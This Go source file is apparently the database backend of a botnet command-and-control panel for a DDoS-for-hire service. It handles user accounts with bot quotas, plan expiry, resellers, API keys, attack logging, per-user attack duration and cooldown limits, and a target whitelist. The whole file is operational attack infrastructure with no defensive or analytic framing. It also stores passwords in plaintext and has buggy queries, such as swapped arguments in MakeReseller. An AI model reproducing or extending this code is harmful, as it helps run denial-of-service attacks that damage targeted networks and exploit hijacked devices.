package main

import (
	"database/sql"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"time"
	_ "github.com/go-sql-driver/mysql"
)

type Database struct {
db *sql.DB
}

type AccountInfo struct {
ID       int
username string
maxBots  int
admin    int
mfaSecret string
planExpire int64
tempBan    int64
Reseller     bool
Subordinates []int
}

type User struct {
ID       int
Username string
Password string
Admin     bool
MfaSecret string
MaxTime  int
Cooldown int
PlanExpire int64
TempBan    int64
Subordinates string
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
if err != nil {
fmt.Println(err)
}

fmt.Println("\033[00;1;95mPriority Screened!\033[00;97m")
return &Database{db}
}

func (this *Database) TryLogin(username string, password string, ip net.Addr) (bool, AccountInfo) {
rows, err := this.db.Query("SELECT id, username, max_bots, admin, mfaSecret, planExpire, tempBan, reseller, subordinates FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
t := time.Now()
strRemoteAddr := ip.String()
host, port, err := net.SplitHostPort(strRemoteAddr)

if err != nil {
fmt.Println(err)
fmt.Printf("\033[00;1;96mFailed Login In\033[00;97m - %s - %s - %s - %s\033[00;97m\n", username, host, port, t.Format("20060102150405"))
this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", host)
return false, AccountInfo{}
}

defer rows.Close()
if !rows.Next() {
fmt.Printf("\033[00;1;96mFailed Login In\033[00;97m - %s - %s - %s - %s\033[00;97m\n", username, host, port, t.Format("20060102150405"))
this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", username, "Fail", host)
return false, AccountInfo{}
}

var subordinates string

var accInfo AccountInfo
rows.Scan(
&accInfo.ID,
&accInfo.username,
&accInfo.maxBots,
&accInfo.admin,
&accInfo.mfaSecret,
&accInfo.planExpire,
&accInfo.tempBan,
&accInfo.Reseller,
&subordinates,
)

for _, subordinate := range strings.Split(subordinates, ",") {
id, err := strconv.Atoi(subordinate)
if err != nil {
continue
}
accInfo.Subordinates = append(accInfo.Subordinates, id)
}

fmt.Printf("\033[00;1;95mLogged In \033[00;97m- %s - %s - %s - %s\033[00;97m\n", accInfo.username, host, port, t.Format("20060102150405"))
this.db.Exec("INSERT INTO logins (username, action, ip) VALUES (?, ?, ?)", accInfo.username, "Login", host)
return true, accInfo
}

func (this *Database) ChangeUsersPassword(username string, password string) bool {
_, err := this.db.Query("UPDATE `users` SET `password` = ? WHERE `username` = ?", password, username)
if err != nil {
fmt.Println(err)
return false
}

return true
}

func (this *Database) UserToggleMfa(username string, secret string) bool {
_, err := this.db.Query("UPDATE `users` SET `mfaSecret` = ? WHERE `username` = ?", secret, username)
if err != nil {
fmt.Println(err)
return false
}

return true
}

func (this *Database) UserSetPlanExpire(username string, expire int64) bool {
_, err := this.db.Query("UPDATE `users` SET `planExpire` = ? WHERE `username` = ?", expire, username)
if err != nil {
fmt.Println(err)
return false
}

return true
}

func (this *Database) UserTempBan(username string, expire int64) bool {
_, err := this.db.Query("UPDATE `users` SET `tempban` = ? WHERE `username` = ?", expire, username)
if err != nil {
fmt.Println(err)
return false
}

return true
}

func (this *Database) CreateBasic(username string, password string, max_bots int, duration int, cooldown int, planExpire int, creator int) bool {
rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
if err != nil {
fmt.Println(err)
return false
}

if rows.Next() {
return false
}

result, err := this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit, planExpire) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?, ?)",
username,
password,
max_bots,
cooldown,
duration,
time.Now().Add((time.Hour*24)*time.Duration(planExpire)).Unix(),
)

var subordinates string
this.db.QueryRow("SELECT `subordinates` FROM `users` WHERE `id` = ?", creator).Scan(
&subordinates,
)

userID, _ := result.LastInsertId()
subordinates += "," + fmt.Sprint(userID)
this.db.Exec("UPDATE `users` SET `subordinates` = ? WHERE `id` = ?",
subordinates,
creator,
)

return true
}

func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
if err != nil {
fmt.Println(err)
return false
}

if rows.Next() {
return false
}

this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
return true
}

func (this *Database) RemoveUser(username string) bool {
rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
if err != nil {
fmt.Println(err)
return false
}

if rows.Next() {
return false
}

this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
return true
}

func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
if err != nil {
fmt.Println(err)
return false
}
defer rows.Close()
for rows.Next() {
var prefix string
var netmask uint8
rows.Scan(&prefix, &netmask)

ip := net.ParseIP(prefix)
ip = ip[12:]
iWhitelistPrefix := binary.BigEndian.Uint32(ip)

for aPNetworkOrder, aN := range attack.Targets {
rvBuf := make([]byte, 4)
binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
if aN > netmask {
if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
return true
}
} else if aN < netmask {
if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
return true
}
} else {
if iWhitelistPrefix == iAttackPrefix {
return true
}
}
}
}
return false
}

func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
rows, err := this.db.Query("SELECT id, duration_limit, admin, cooldown FROM users WHERE username = ?", username)
defer rows.Close()
if err != nil {
fmt.Println(err)
}

var userId, durationLimit, admin, cooldown uint32
if !rows.Next() {
return false, errors.New("                                \033[00;1;96m║\033[31mYour Access Has Been Terminated!\033[00;97m")
}

rows.Scan(&userId, &durationLimit, &admin, &cooldown)

if durationLimit != 0 && duration > durationLimit {
return false, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;95mYour Max Boot Time Is \033[38;5;93m%d\033[00;1;95m Seconds!\033[00;97m", durationLimit))
}

rows.Close()

if admin == 0 {
rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
if err != nil {
fmt.Println(err)
}

if rows.Next() {
var timeSent, historyDuration uint32
rows.Scan(&timeSent, &historyDuration)
return false, errors.New(fmt.Sprintf("                                \033[00;1;96m║\033[00;1;95mCooldown, \033[38;5;93m%d \033[00;1;95mSeconds Left!\033[00;97m", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
}
}

this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
return true, nil
}

func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
if err != nil {
fmt.Println(err)
return false, AccountInfo{}
}

defer rows.Close()
if !rows.Next() {
return false, AccountInfo{}
}

var accInfo AccountInfo
rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
return true, accInfo
}

func (this *Database) GetUser(username string) (User, error) {

var user User

err := this.db.QueryRow("SELECT `id`, `username`, `password`, `admin`, `duration_limit`, `mfaSecret`, `cooldown`, `planExpire`, `subordinates` FROM `users` WHERE `username` = ? LIMIT 1", username).Scan(
&user.ID,
&user.Username,
&user.Password,
&user.Admin,
&user.MaxTime,
&user.MfaSecret,
&user.Cooldown,
&user.PlanExpire,
&user.Subordinates,
)
return user, err
}

func (this *Database) GetUserFromID(userID int) (User, error) {

var user User

err := this.db.QueryRow("SELECT `id`, `username`, `password`, `admin`, `duration_limit`, `mfaSecret`, `cooldown`, `planExpire`, `subordinates` FROM `users` WHERE `id` = ? LIMIT 1", userID).Scan(
&user.ID,
&user.Username,
&user.Password,
&user.Admin,
&user.MaxTime,
&user.MfaSecret,
&user.Cooldown,
&user.PlanExpire,
&user.Subordinates,
)
return user, err
}

func (this *Database) GetUsers() ([]User, error) {
var list []User

rows, err := this.db.Query("SELECT `id`, `username`, `password`, `admin`, `duration_limit`, `mfaSecret`, `cooldown`, `planExpire`, `tempban`, `subordinates` FROM `users`")
if err != nil {
return nil, err
}

defer rows.Close()
for rows.Next() {
var user User
err := rows.Scan(
&user.ID,
&user.Username,
&user.Password,

&user.Admin,
&user.MaxTime,
&user.MfaSecret,
&user.Cooldown,

&user.PlanExpire,
&user.TempBan,
&user.Subordinates,
)

if err != nil {
log.Println(err)
continue
}
list = append(list, user)
}

err = rows.Err()
if err != nil {
return list, err
}

return list, nil
}

func (user User) Mfa() bool {
if len(user.MfaSecret) > 0 {
return true
}

return false
}

func (this *Database) MakeReseller(username string, days int) bool {
	_, err := this.db.Query("UPDATE `users` SET `reseller` = ? WHERE `username` = ?", username, days)
	if err != nil {
		fmt.Println(err)
		return false
	}

	return true
}
